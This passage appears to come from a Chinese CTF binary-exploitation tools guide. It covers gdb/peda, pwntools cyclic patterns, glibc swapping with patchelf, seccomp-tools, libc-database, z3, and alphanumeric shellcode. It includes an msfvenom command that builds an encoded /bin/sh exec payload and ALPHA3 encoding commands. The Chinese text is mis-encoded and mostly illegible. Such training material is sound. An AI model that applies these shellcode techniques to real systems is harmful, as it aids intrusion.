<li>x/b addr æŸ¥çœ‹addrå¤„çš„å­—ç¬¦</li>
<li><strong>x/10i addr æŸ¥çœ‹addrå¤„çš„åæ±‡ç¼–ç»“æœï¼ˆaddrå¯ä»¥ä¸ºå‡½æ•°ï¼‰ï¼ˆå¸¸ç”¨ï¼‰</strong></li>
</ul>
<h4 id="info-i"><a href="#info-i" class="headerlink" title="info(i)"></a>info(i)</h4><ul>
<li><strong>info register $ebp æŸ¥çœ‹å¯„å­˜å™¨ebpä¸­çš„å†…å®¹ (ç®€å†™ä¸º i r ebp)</strong></li>
<li>i r eflags æŸ¥çœ‹çŠ¶æ€å¯„å­˜å™¨</li>
<li>i r ss æŸ¥çœ‹æ®µå¯„å­˜å™¨</li>
<li>i b æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯</li>
<li>i functions æŸ¥çœ‹æ‰€æœ‰çš„å‡½æ•°</li>
</ul>
<h4 id="æŸ¥æ‰¾æ•°æ®"><a href="#æŸ¥æ‰¾æ•°æ®" class="headerlink" title="æŸ¥æ‰¾æ•°æ®"></a>æŸ¥æ‰¾æ•°æ®</h4><ul>
<li><strong>find æŸ¥æ‰¾å­—ç¬¦ä¸² pedaå¸¦æœ‰ï¼ˆå¸¸ç”¨ï¼‰</strong></li>
<li>searchmem æŸ¥æ‰¾å­—ç¬¦ä¸² pedaå¸¦æœ‰</li>
<li>ropsearch â€œxor eax,eax;retâ€ 0x08048080 0x08050000 æŸ¥æ‰¾æŸæ®µçš„rop pedaå¸¦æœ‰</li>
<li>ropgadget æä¾›å¤šä¸ªpop|retå¯è¡Œç»“æœ pedaå¸¦æœ‰</li>
</ul>
<h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="1-contextè®¾ç½®"><a href="#1-contextè®¾ç½®" class="headerlink" title="1. contextè®¾ç½®"></a>1. contextè®¾ç½®</h3><p><code>context</code>æ˜¯pwntoolsç”¨æ¥è®¾ç½®ç¯å¢ƒçš„åŠŸèƒ½ã€‚åœ¨å¾ˆå¤šæ—¶å€™ï¼Œç”±äºäºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µä¸åŒï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦è¿›è¡Œä¸€äº›ç¯å¢ƒè®¾ç½®æ‰èƒ½å¤Ÿæ­£å¸¸è¿è¡Œexpï¼Œæ¯”å¦‚æœ‰ä¸€äº›éœ€è¦è¿›è¡Œæ±‡ç¼–ï¼Œä½†æ˜¯32çš„æ±‡ç¼–å’Œ64çš„æ±‡ç¼–ä¸åŒï¼Œå¦‚æœä¸è®¾ç½®contextä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ã€‚</p>
<p>ä¸€èˆ¬æ¥è¯´æˆ‘ä»¬è®¾ç½®contextåªéœ€è¦ç®€å•çš„ä¸€å¥è¯:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">context(<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>, <span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span>, <span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>è¿™å¥è¯çš„æ„æ€æ˜¯ï¼š </p>
<ol>
<li>osï¼ˆoperating system æ“ä½œç³»ç»Ÿï¼‰è®¾ç½®ç³»ç»Ÿä¸ºlinuxç³»ç»Ÿï¼Œåœ¨å®Œæˆctfé¢˜ç›®çš„æ—¶å€™ï¼Œå¤§å¤šæ•°pwné¢˜ç›®çš„ç³»ç»Ÿéƒ½æ˜¯linux </li>
<li>archè®¾ç½®æ¶æ„ä¸ºamd64ï¼Œå¯ä»¥ç®€å•çš„è®¤ä¸ºè®¾ç½®ä¸º64ä½çš„æ¨¡å¼ï¼Œå¯¹åº”çš„32ä½æ¨¡å¼æ˜¯â€™i386â€™ </li>
<li>log_levelè®¾ç½®æ—¥å¿—è¾“å‡ºçš„ç­‰çº§ä¸ºdebugï¼Œè¿™å¥è¯åœ¨è°ƒè¯•çš„æ—¶å€™ä¸€èˆ¬ä¼šè®¾ç½®ï¼Œè¿™æ ·pwntoolsä¼šå°†å®Œæ•´çš„ioè¿‡ç¨‹éƒ½æ‰“å°ä¸‹æ¥ï¼Œä½¿å¾—è°ƒè¯•æ›´åŠ æ–¹ä¾¿ï¼Œå¯ä»¥é¿å…åœ¨å®ŒæˆCTFé¢˜ç›®æ—¶å‡ºç°ä¸€äº›å’ŒIOç›¸å…³çš„é”™è¯¯ã€‚</li>
</ol>
<h3 id="2-Cyclic-Pattern"><a href="#2-Cyclic-Pattern" class="headerlink" title="2. Cyclic Pattern"></a>2. Cyclic Pattern</h3><p>Cyclic patternæ˜¯ä¸€ä¸ªå¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ï¼Œä½¿ç”¨pwntoolsç”Ÿæˆä¸€ä¸ªpatternï¼Œpatternå°±æ˜¯æŒ‡ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡å…¶ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ®å»å®šä½åˆ°ä»–åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„ä½ç½®ã€‚</p>
<p>åœ¨æˆ‘ä»¬å®Œæˆæ ˆæº¢å‡ºé¢˜ç›®çš„æ—¶å€™ï¼Œä½¿ç”¨patternå¯ä»¥å¤§å¤§çš„å‡å°‘è®¡ç®—æº¢å‡ºç‚¹çš„æ—¶é—´ã€‚ </p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">ç”¨æ³•ï¼š<br>cyclic(<span class="hljs-number">0</span>x100) <span class="hljs-meta"># ç”Ÿæˆä¸€ä¸ª0x100å¤§å°çš„patternï¼Œå³ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²</span><br>cyclic_find(<span class="hljs-number">0</span>x61616161) <span class="hljs-meta"># æ‰¾åˆ°è¯¥æ•°æ®åœ¨patternä¸­çš„ä½ç½®</span><br>cyclic_find(&#x27;aaaa&#x27;) <span class="hljs-meta"># æŸ¥æ‰¾ä½ç½®ä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å»å®šä½</span><br></code></pre></td></tr></table></figure>

<p>æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œé¦–å…ˆæ„é€ <code>cyclic(0x100)</code>ï¼Œæˆ–è€…æ›´é•¿é•¿åº¦çš„patternï¼Œè¿›è¡Œè¾“å…¥ï¼Œè¾“å…¥åpcçš„å€¼å˜ä¸ºäº†0x61616161ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡<code>cyclic_find(0x61616161)</code>å°±å¯ä»¥å¾—åˆ°ä»å“ªä¸€ä¸ªå­—èŠ‚å¼€å§‹ä¼šæ§åˆ¶PCå¯„å­˜å™¨äº†ï¼Œé¿å…äº†å¾ˆå¤šæ²¡å¿…è¦çš„è®¡ç®—ã€‚</p>
<p>å¯ä»¥ç›´æ¥åœ¨shellä¸­ä½¿ç”¨cyclic 100</p>
<p>ç„¶åæŸ¥æ‰¾æº¢å‡ºç‚¹ ä½¿ç”¨ cyclic -l 0x61616161</p>
<p>æ¥æºï¼š<a href="https://blog.csdn.net/qq_29343201/article/details/51337025">https://blog.csdn.net/qq_29343201/article/details/51337025</a></p>
<p><strong>è½¬è½½è‡ªï¼š<a href="https://blog.csdn.net/qq_41560595/article/details/114597342">https://blog.csdn.net/qq_41560595/article/details/114597342</a></strong></p>
<p>åœ¨åšå †å®éªŒæ—¶ï¼Œé«˜ç‰ˆæœ¬çš„glibcæ‰€å«çš„tcacheä¼šå¯¹è°ƒè¯•äº§ç”Ÿå½±å“ã€‚ä¸‹é¢å®‰è£…ä¸åŒç‰ˆæœ¬çš„glibc.<br>ä¸‹é¢ä»¥å®‰è£…2.23ç‰ˆæœ¬ä¸ºä¾‹ï¼š</p>
<h2 id="patchelf-amp-amp-glibc-all-in-one"><a href="#patchelf-amp-amp-glibc-all-in-one" class="headerlink" title="patchelf &amp;&amp; glibc-all-in-one"></a>patchelf &amp;&amp; glibc-all-in-one</h2><p><strong>patchelf</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/NixOS/patchelf<br></code></pre></td></tr></table></figure>

<p><strong>glibc-all-in-one</strong></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one<br></code></pre></td></tr></table></figure>

<h3 id="1-å®‰è£…glibc-all-in-one"><a href="#1-å®‰è£…glibc-all-in-one" class="headerlink" title="1. å®‰è£…glibc-all-in-one"></a>1. å®‰è£…glibc-all-in-one</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./update_list             <span class="hljs-comment">#æ›´æ–°æœ€æ–°ç‰ˆæœ¬çš„glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> cat list                 <span class="hljs-comment">#æŸ¥çœ‹å¯ä¸‹è½½çš„glibc</span></span><br><span class="hljs-meta">$</span><span class="bash"> ./download 2.23-0ubuntu11.2_amd64        <span class="hljs-comment">#glibcä¸ºä½ æƒ³è¦ä¸‹è½½glibcçš„åå­—</span></span><br></code></pre></td></tr></table></figure>

<h3 id="2-å®‰è£…patchelf"><a href="#2-å®‰è£…patchelf" class="headerlink" title="2. å®‰è£…patchelf"></a>2. å®‰è£…patchelf</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./bootstrap.sh<br>./configure<br>make<br>sudo make install<br>make check<br></code></pre></td></tr></table></figure>

<p>å¯èƒ½ä¼šé‡åˆ° <code>autoreconf: not found</code>çš„æŠ¥é”™</p>
<p>å®‰è£…ä¸€ä¸‹å°±å¥½</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt-get install autoconf automake libtool<br></code></pre></td></tr></table></figure>

<h3 id="3-ç”Ÿæˆæ‰€éœ€çš„ç¬¦å·é“¾æ¥"><a href="#3-ç”Ÿæˆæ‰€éœ€çš„ç¬¦å·é“¾æ¥" class="headerlink" title="3.ç”Ÿæˆæ‰€éœ€çš„ç¬¦å·é“¾æ¥"></a>3.ç”Ÿæˆæ‰€éœ€çš„ç¬¦å·é“¾æ¥</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"><span class="hljs-built_in">cd</span> /libs  <span class="hljs-comment">#è¿›å…¥libsçš„ç›®å½•</span></span>  <br><span class="hljs-meta">$</span><span class="bash"> sudo su    <span class="hljs-comment">#è¿›å…¥rootæ€</span></span><br><span class="hljs-meta">$</span><span class="bash"> ln -s /home/pwn/æ¡Œé¢/tools/glibc-all-in_one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so ./23_11-linux.so.2</span><br><span class="hljs-meta">#</span><span class="bash">./23_11-linux.so.2æ˜¯è‡ªå·±èµ·çš„åã€‚23ä»£è¡¨glibcç‰ˆæœ¬,11ä»£è¡¨ubuntuåé¢çš„æ•°å­—(å•çº¯ä¸ºäº†å¥½è®°)</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l <span class="hljs-comment">#å¯ä»¥çœ‹åˆ°ç”Ÿæˆçš„ç¬¦å·é“¾æ¥</span></span><br></code></pre></td></tr></table></figure>

<p>æ–‡ä»¶è·¯å¾„è¦æ³¨æ„ä¿®æ”¹ä¸ºè‡ªå·±çš„è·¯å¾„</p>
<h3 id="4-æ›´æ”¹elfæ–‡ä»¶çš„ldå’Œlibc"><a href="#4-æ›´æ”¹elfæ–‡ä»¶çš„ldå’Œlibc" class="headerlink" title="4.æ›´æ”¹elfæ–‡ä»¶çš„ldå’Œlibc"></a>4.æ›´æ”¹elfæ–‡ä»¶çš„ldå’Œlibc</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> patchelf --set-interpreter /lib64/23_11-linux.so.2 ./chunk_extend_2</span><br><span class="hljs-meta">$</span><span class="bash"> patchelf --replace-needed libc.so.6 /home/pwn/æ¡Œé¢/tools/glibc-all-in_one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so ./chunk_extend_2</span><br><span class="hljs-meta">#</span><span class="bash">libc.so.6ä¸ºéœ€è¦æ›¿æ¢çš„libcè·¯å¾„ ç¬¬äºŒä¸ªå‚æ•°æ˜¯éœ€è¦åŠ è½½çš„glibcçš„ç›®å½•    chunk_extend_2 æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶</span><br><span class="hljs-meta">$</span><span class="bash"> ldd ./bin <span class="hljs-comment">#æŸ¥çœ‹elfçš„ldå’Œlibc</span></span><br></code></pre></td></tr></table></figure>

<h3 id="æˆ‘è‡ªå·±è°ƒå¼æƒ…å†µï¼š"><a href="#æˆ‘è‡ªå·±è°ƒå¼æƒ…å†µï¼š" class="headerlink" title="æˆ‘è‡ªå·±è°ƒå¼æƒ…å†µï¼š"></a>æˆ‘è‡ªå·±è°ƒå¼æƒ…å†µï¼š</h3><p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418121652.png"></p>
<p>é¦–å…ˆï¼Œè¿™æ˜¯è¿˜æœªæ›´æ¢çš„æ–‡ä»¶çš„ldå’Œlibc</p>
<p>å½“è¾“å…¥<code>patchelf --replace-needed libc.so.6 /home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc.so.6 1</code>æ—¶</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418122225.png"></p>
<p>å¯ä»¥å‘ç°ï¼Œlibc.so.6çš„è·¯å¾„è¢«æ›´æ¢äº†ï¼Œæ¢ä¸ºäº†glibc-all-in-onç›®å½•ä¸‹çš„libc.so.6ï¼Œæœ¬æ¥æŒ‰ç…§ä¸Šé¢çš„æ¥è®²ï¼Œæ€»å…±æ˜¯è¦ä¸¤æ­¥çš„ï¼Œå…ˆæ˜¯æ›´æ¢é“¾æ¥å™¨ï¼Œç„¶åæ”¹å˜libcè·¯å¾„ã€‚ä½†æ˜¯æˆ‘ç›´æ¥å»ä¿®æ”¹libcçš„è·¯å¾„ï¼Œå¾—åˆ°çš„ç»“æœæ˜¯è·Ÿä¸Šè¿°æ˜¯ä¸€æ ·çš„ï¼Œå·²ç»å®Œæˆäº†ä¿®æ”¹ã€‚</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/QQ%E5%9B%BE%E7%89%8720210418122806.png"></p>
<p>å»ä¿®æ”¹é“¾æ¥å™¨ï¼Œæœ€ç»ˆæŒ‡å‘çš„ä»ç„¶æ˜¯<code>/lib64/ld-linux-x86-64.so.2</code> å¹¶æ²¡æœ‰åœ¨æœ¬è´¨ä¸Šæ”¹å˜äº†ä»€ä¹ˆ</p>
<p>ç»“è®ºä¸ºï¼šæš‚æ—¶ä¸çŸ¥é“æ˜¯å› ä¸ºä»€ä¹ˆï¼Œä¸è¿‡è¿˜æ˜¯å»ºè®®æŒ‰ä¸Šé¢æ­¥éª¤æ¥</p>
<h2 id="seccomp-tools-å·¥å…·"><a href="#seccomp-tools-å·¥å…·" class="headerlink" title="seccomp-tools å·¥å…·"></a>seccomp-tools å·¥å…·</h2><p>å¯ä»¥<strong>seccomp-tools</strong>è¿™ä¸ªå·¥å…·å»æŸ¥çœ‹ç¦ç”¨çš„ç³»ç»Ÿè°ƒç”¨</p>
<ul>
<li><p>å®‰è£…ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt install gcc ruby-dev</span><br><span class="hljs-meta">$</span><span class="bash"> sudo gem install seccomp-tools</span><br></code></pre></td></tr></table></figure></li>
<li><p>ä½¿ç”¨ï¼šä¸€èˆ¬ç”¨åˆ°dumpè¿™ä¸ªç”¨æ³•ï¼Œå…¶ä»–è¯¦ç»†ç”¨æ³•å¯è§ä¸Šé¢githubã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">seccomp-tools dump ./xxx<br></code></pre></td></tr></table></figure></li>
</ul>
<h2 id="libc-database"><a href="#libc-database" class="headerlink" title="libc_database"></a>libc_database</h2><p>æœ‰ä¸€äº›PWNé¢˜æ•…æ„ä¸ç»™libcæ–‡ä»¶ï¼Œä½†æ˜¯å¯ä»¥æ³„éœ²åœ°å€ï¼Œlibc databaseå¯ä»¥åˆ©ç”¨æ³„éœ²çš„åœ°å€æ¥ç¡®å®šæœåŠ¡å™¨ä½¿ç”¨çš„libcã€‚</p>
<p>å…ˆä¸‹è½½libc database</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/niklasb/libc-database<br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨getæ¥ä¸‹è½½æµè¡Œçš„libcåº“</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cd libc-database<br>./get ubuntu<br></code></pre></td></tr></table></figure>

<p>ç¨‹åºä¼šè‡ªåŠ¨åœ¨ubuntuç½‘ç«™ä¸Šä¸‹è½½ç›¸å…³çš„libcæ–‡ä»¶ï¼Œå­˜å‚¨åˆ°./dbæ–‡ä»¶å¤¹ä¸‹</p>
<p>ç”¨æ³•ï¼šä½¿ç”¨./findå¯ä»¥åœ¨dbä¸­æ‰¾åˆ°å¯¹åº”libcï¼Œå¦‚æ³„éœ²çš„åœ°å€æ˜¯printf 0xf7xxxx260 puts 0xf7xxxf30ï¼Œè¾“å…¥æœ€åä¸‰ä½å³å¯</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./find <span class="hljs-built_in">printf</span> 260 puts f30</span><br></code></pre></td></tr></table></figure>

<h2 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> pip install z3-solver</span><br></code></pre></td></tr></table></figure>

<p>åœ¨python3ä¸Šå®‰è£…è¿™ä¸ªåº“å³å¯ï¼ŒåŠŸèƒ½ååˆ†å¼ºå¤§ï¼Œå¯ä»¥åœ¨pythonä¸­ç”¨è¿™ä¸ªåº“è§£å†³ä»»ä½•æ–¹ç¨‹ï¼ˆåªè¦æœ‰è§£ï¼‰</p>
<h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>æ¥æºï¼š<a href="https://www.jianshu.com/p/64d87659673a">https://www.jianshu.com/p/64d87659673a</a></p>
<p>é¦–å…ˆè¦ç»™æ‰€æœ‰çš„å˜é‡è®¾ç½®ä¸€ä¸ªç±»å‹ï¼Œä»–æœ‰å¾ˆå¤šç§ç±»å‹ï¼ŒIntå‹ä»–ä»£è¡¨æ•´æ•°æ‰€æœ‰çš„è§£éƒ½åªèƒ½æ˜¯æ•´æ•°ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨Intsä¸€æ¬¡æ€§è®¾ç½®å¤šä¸ªå˜é‡</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/webp" alt="img"></p>
<p>è¿˜æœ‰å°±æ˜¯Realå‹çš„è¿™ä¸ªä»£è¡¨çš„æ˜¯æœ‰ç†æ•°ï¼Œå¯ä»¥è§£å‡ºæ‰€æœ‰çš„æœ‰ç†æ•°</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/2" alt="img"></p>
<p>BitVec(â€˜aâ€™ , 8)ï¼Œç”¨æ¥è¿›è¡Œä½çš„è¿ç®—ä¸æ±‚è§£ï¼ˆç¬¬äºŒä¸ªæ˜¯æŒ‡å˜é‡çš„ä½çš„ä¸ªæ•°ï¼‰</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/3" alt="img"></p>
<p>é¦–å…ˆæ˜¯ç»™å˜é‡èµ‹å€¼ï¼Œè®¾ç½®ä¸€ä¸ªè§£æ–¹ç¨‹çš„ç±»Solverï¼Œç„¶åä¸€ä¸ªä¸€ä¸ªæ·»åŠ ï¼ˆè¿™æ ·æ¯”è¾ƒç›´è§‚ï¼‰ï¼Œcheckä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰è§£ï¼Œæœ€åå¾—å‡ºä¸€ä¸ªè§£ï¼Œå½“ç„¶è¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/4" alt="img"></p>
<p>ç›´æ¥ç”¨solveå‡½æ•°å°±å¯ä»¥äº†</p>
<p><img src="/2020/12/01/pwn%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8C%87%E4%BB%A4/5" alt="img"></p>
<h2 id="çº¯å­—ç¬¦shellcode"><a href="#çº¯å­—ç¬¦shellcode" class="headerlink" title="çº¯å­—ç¬¦shellcode"></a>çº¯å­—ç¬¦shellcode</h2><p>æ¥æºï¼š</p>
<p><a href="https://www.codenong.com/cs105236336/">https://www.codenong.com/cs105236336/</a></p>
<p><a href="https://xz.aliyun.com/t/5662#toc-4">https://xz.aliyun.com/t/5662#toc-4</a></p>
<p><a href="https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/">https://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/</a></p>
<h3 id="å¯è§å­—ç¬¦èƒ½ç»„æˆçš„æ±‡ç¼–ä»£ç "><a href="#å¯è§å­—ç¬¦èƒ½ç»„æˆçš„æ±‡ç¼–ä»£ç " class="headerlink" title="å¯è§å­—ç¬¦èƒ½ç»„æˆçš„æ±‡ç¼–ä»£ç "></a>å¯è§å­—ç¬¦èƒ½ç»„æˆçš„æ±‡ç¼–ä»£ç </h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">1.æ•°æ®ä¼ é€:<br>push/pop eaxâ€¦<br>pusha/popa<br><br>2.ç®—æœ¯è¿ç®—:<br>inc/dec eaxâ€¦<br>sub al, ç«‹å³æ•°<br>sub byte ptr [eaxâ€¦ + ç«‹å³æ•°], al dlâ€¦<br>sub byte ptr [eaxâ€¦ + ç«‹å³æ•°], ah dhâ€¦<br>sub dword ptr [eaxâ€¦ + ç«‹å³æ•°], esi edi<br>sub word ptr [eaxâ€¦ + ç«‹å³æ•°], si di<br>sub al dlâ€¦, byte ptr [eaxâ€¦ + ç«‹å³æ•°]<br>sub ah dhâ€¦, byte ptr [eaxâ€¦ + ç«‹å³æ•°]<br>sub esi edi, dword ptr [eaxâ€¦ + ç«‹å³æ•°]<br>sub si di, word ptr [eaxâ€¦ + ç«‹å³æ•°]<br><br>3.é€»è¾‘è¿ç®—:<br>and al, ç«‹å³æ•°<br>and dword ptr [eaxâ€¦ + ç«‹å³æ•°], esi edi<br>and word ptr [eaxâ€¦ + ç«‹å³æ•°], si di<br>and ah dhâ€¦, byte ptr [ecx edxâ€¦ + ç«‹å³æ•°]<br>and esi edi, dword ptr [eaxâ€¦ + ç«‹å³æ•°]<br>and si di, word ptr [eaxâ€¦ + ç«‹å³æ•°]<br><br>xor al, ç«‹å³æ•°<br>xor byte ptr [eaxâ€¦ + ç«‹å³æ•°], al dlâ€¦<br>xor byte ptr [eaxâ€¦ + ç«‹å³æ•°], ah dhâ€¦<br>xor dword ptr [eaxâ€¦ + ç«‹å³æ•°], esi edi<br>xor word ptr [eaxâ€¦ + ç«‹å³æ•°], si di<br>xor al dlâ€¦, byte ptr [eaxâ€¦ + ç«‹å³æ•°]<br>xor ah dhâ€¦, byte ptr [eaxâ€¦ + ç«‹å³æ•°]<br>xor esi edi, dword ptr [eaxâ€¦ + ç«‹å³æ•°]<br>xor si di, word ptr [eaxâ€¦ + ç«‹å³æ•°]<br><br>4.æ¯”è¾ƒæŒ‡ä»¤:<br>cmp al, ç«‹å³æ•°<br>cmp byte ptr [eaxâ€¦ + ç«‹å³æ•°], al dlâ€¦<br>cmp byte ptr [eaxâ€¦ + ç«‹å³æ•°], ah dhâ€¦<br>cmp dword ptr [eaxâ€¦ + ç«‹å³æ•°], esi edi<br>cmp word ptr [eaxâ€¦ + ç«‹å³æ•°], si di<br>cmp al dlâ€¦, byte ptr [eaxâ€¦ + ç«‹å³æ•°]<br>cmp ah dhâ€¦, byte ptr [eaxâ€¦ + ç«‹å³æ•°]<br>cmp esi edi, dword ptr [eaxâ€¦ + ç«‹å³æ•°]<br>cmp si di, word ptr [eaxâ€¦ + ç«‹å³æ•°]<br><br>5.è½¬ç§»æŒ‡ä»¤:<br>push 56h<br>pop eax<br>cmp al, 43h<br>jnz lable<br><br>&lt;=&gt; jmp lable<br><br>6.äº¤æ¢al, ah<br>push eax<br>xor ah, byte ptr [esp] // ah ^= al<br>xor byte ptr [esp], ah // al ^= ah<br>xor ah, byte ptr [esp] // ah ^= al<br>pop eax<br><br>7.æ¸…é›¶:<br>push 44h<br>pop eax<br>sub al, 44h ; eax = 0<br><br>push esi<br>push esp<br>pop eax<br>xor [eax], esi ; esi = 0<br></code></pre></td></tr></table></figure>

<h3 id="msfå†…ç½®çš„encoder"><a href="#msfå†…ç½®çš„encoder" class="headerlink" title="msfå†…ç½®çš„encoder"></a>msfå†…ç½®çš„encoder</h3><h4 id="ä¸€ã€å†…ç½®çš„shellcode"><a href="#ä¸€ã€å†…ç½®çš„shellcode" class="headerlink" title="ä¸€ã€å†…ç½®çš„shellcode"></a>ä¸€ã€å†…ç½®çš„shellcode</h4><p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -a x86 --platform linux -p linux/x86/exec CMD=&quot;/bin/sh&quot; -e x86/alpha_upper BufferRegister=eax<br></code></pre></td></tr></table></figure>

<p>BufferRegisteræŒ‡çš„æ˜¯æŒ‡å‘shellcodeçš„å¯„å­˜å™¨çš„å€¼</p>
<h4 id="äºŒã€ç”¨msfç¼–ç è‡ªå·±å†™çš„shellcode"><a href="#äºŒã€ç”¨msfç¼–ç è‡ªå·±å†™çš„shellcode" class="headerlink" title="äºŒã€ç”¨msfç¼–ç è‡ªå·±å†™çš„shellcode"></a>äºŒã€ç”¨msfç¼–ç è‡ªå·±å†™çš„shellcode</h4><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cat shellcode | msfvenom -a x86 --platform linux -e x86/alpha_upper BufferRegister=eax<br></code></pre></td></tr></table></figure>

<h3 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h3><p>ä¿®æ”¹å®Œä¹‹åè¿˜éœ€è¦ç¼–è¯‘æºç ï¼Œä½†æ˜¯ç¼–è¯‘æºç çš„å·¥å…·ä¹Ÿåœ¨googleä¸Šï¼Œå¦‚æœæ‡’å¾—è‡ªå·±ç¼–è¯‘ï¼Œå¯ä»¥ç›´æ¥ä¸‹è½½å¤§ä½¬çš„ä¿®æ”¹ç‰ˆ:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">git clone https://github.com/TaQini/alpha3.git<br></code></pre></td></tr></table></figure>

<p>ä¹‹åè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p>
<p>x64ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;shellcode&quot;<br></code></pre></td></tr></table></figure>

<p>raxæ˜¯ç”¨äºç¼–ç çš„å¯„å­˜å™¨(shellcodeåŸºå€)ï¼Œå°±æ˜¯åœ¨æ‰§è¡Œshellcodeæ—¶ï¼Œå€Ÿç”¨è·³è½¬æ‰§è¡Œçš„å¯„å­˜å™¨ï¼Œå¦‚call raxã€‚å°±å¡«å…¥rax</p>
<p>x86ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python ./ALPHA3.py x86 ascii mixedcase eax --input=&quot;shellcode_x86&quot;<br>python ./ALPHA3.py x86 ascii lowercase eax --input=&quot;shellcode_x86&quot;<br>python ./ALPHA3.py x86 ascii uppercase eax --input=&quot;shellcode_x86&quot;<br></code></pre></td></tr></table></figure>

